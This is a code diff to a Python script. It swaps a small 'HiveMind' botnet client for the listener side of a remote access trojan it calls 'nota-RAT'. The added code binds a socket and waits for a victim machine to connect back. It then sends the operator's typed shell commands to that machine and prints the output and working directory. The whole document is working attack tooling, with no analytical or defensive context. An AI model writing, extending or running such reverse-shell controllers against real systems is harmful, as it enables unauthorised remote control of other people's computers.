@@ -1,60 +1,45 @@
 import socket
 import argparse
-import sys
+
 
 parser = argparse.ArgumentParser(
-    description="HiveMind, python bot net using sockets."
-)
-
-parser.add_argument("host", nargs="?", help="Address of the Server.")
-
-parser.add_argument(
-    "-p", "--port", default=420, help="Port the Server is running on.", type=int
+    description="nota-RAT, python reverse shell using sockets."
 )
 
 parser.add_argument(
-    "-b",
-    "--bot",
-    dest="bot",
-    default="vers",
-    type=str,
-    help="The bot number this is.",
+    "-p", "--port", default=423, help="Port of the Server", type=int
 )
+
 
 args = parser.parse_args()
+SERVER_HOST = "0.0.0.0"
+SERVER_PORT = args.port
+BUFFER_SIZE = 1024 * 128
+SEPARATOR = "<sep>"
 
+s = socket.socket()
 
-if len(sys.argv) <= 1:
-    parser.print_help()
-    sys.exit(1)
+s.bind((SERVER_HOST, SERVER_PORT))
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.listen(5)
+print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 
-if not args.host:
-    print("Host required! \n")
-    parser.print_help()
-    sys.exit(1)
+client_socket, client_address = s.accept()
+print(f"{client_address[0]}:{client_address[1]} Connected!")
 
-
-HEADER = 64
-PORT = args.port
-FORMAT = 'utf-8'
-DISCONNECT_MESSAGE = "!DISCONNECT"
-SERVER = args.host
-ADDR = (SERVER, PORT)
-
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect(ADDR)
-
-def send(msg):
-    message = msg.encode(FORMAT)
-    msg_length = len(message)
-    send_length = str(msg_length).encode(FORMAT)
-    send_length += b' ' * (HEADER - len(send_length))
-    client.send(send_length)
-    client.send(message)
-    print(client.recv(2048).decode(FORMAT))
+cwd = client_socket.recv(BUFFER_SIZE).decode()
+print("[+] Current working directory:", cwd)
 
 while True:
-    send(input())
-
-
-send(DISCONNECT_MESSAGE)
+    command = input(f"{cwd} $> ")
+    if not command.strip():
+        continue
+    client_socket.send(command.encode())
+    if command.lower() == "exit":
+        break
+    output = client_socket.recv(BUFFER_SIZE).decode()
+    print("output:", output)
+    results, cwd = output.split(SEPARATOR)
+    print(results)
+client_socket.close()
+s.close()
